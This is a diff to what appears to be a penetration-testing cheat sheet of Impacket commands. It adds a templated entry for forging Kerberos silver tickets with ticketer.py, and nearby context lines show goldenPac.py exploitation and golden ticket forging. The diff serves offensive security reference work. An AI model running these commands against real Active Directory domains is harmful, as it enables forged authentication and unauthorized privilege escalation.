@@ -32,6 +32,12 @@ goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
 ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
 ```
 
+## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
+#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
+```
+ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
+```
+
 ## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
 #plateform/linux #target/local  #cat/UTILS
 ```
